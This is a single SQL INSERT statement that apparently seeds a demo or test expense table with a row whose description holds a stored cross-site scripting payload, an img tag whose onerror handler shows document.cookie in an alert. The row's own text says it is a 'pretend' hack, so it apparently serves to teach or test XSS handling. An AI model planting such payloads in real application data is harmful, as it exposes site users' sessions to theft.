INSERT INTO expense_logs (id, amount, style, description)
VALUES
    (666, '1.50', 'Life Style',
        'This text contains an intentionally broken image <img src="https://url.to.file.which/does-not.exist" onerror="alert(document.cookie); alert(''you just got pretend hacked! oh noes!'');">. The image will try to load, when it fails, <strong>it executes malicious JavaScript</strong>');
